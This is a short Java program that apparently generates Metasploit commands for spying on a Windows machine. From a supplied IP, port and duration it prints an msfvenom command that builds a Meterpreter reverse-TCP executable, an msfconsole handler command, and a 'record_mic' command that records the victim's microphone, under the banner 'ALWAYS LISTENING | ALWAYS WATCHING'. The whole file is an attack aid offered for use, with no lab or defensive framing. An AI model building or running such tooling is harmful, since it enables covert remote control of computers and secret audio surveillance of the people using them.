import java.util.*;;

public class run {
    public static void main(String[] args) throws Exception {
        Scanner in = new Scanner(System.in);
        String RED = "\u001B[31m";
  

        String BLUE = "\u001B[34m";


        String CYAN = "\u001B[36m";

        String HIDE = "\u001B[30m";

        String OK = "\u001B[32m";


        System.out.println(RED + "ALWAYS LISTENING | ALWAYS WATCHING \n\n" + BLUE);

        System.out.println(RED + "USAGE: java run.java <ip> <port> <seconds to capture> \n" + BLUE);
        System.out.println();
        System.out.println("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + args[0] + " " + "LPORT="+ args[1] + " " +  "-f exe -o reverse.exe\n");
        System.out.println("msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost " + args[0] + "; " + "set lport "+ args[1] + "; " +  "exploit'\n");
        System.out.println("record_mic -d " + args[2]);
    }
}
